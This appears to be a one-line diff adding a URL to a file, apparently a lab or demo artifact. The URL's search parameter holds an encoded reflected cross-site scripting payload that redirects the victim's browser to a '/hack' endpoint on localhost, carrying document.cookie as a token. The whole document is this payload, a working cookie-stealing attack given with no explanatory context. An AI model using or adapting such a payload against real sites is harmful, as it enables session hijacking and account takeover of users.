@@ -1,0 +1,1 @@
+http://localhost:3001/search?query=%3Cscript%3Ewindow.location=%60http://localhost:3001/hack?token=$%7Bdocument.cookie%7D%60%3C/script%3E
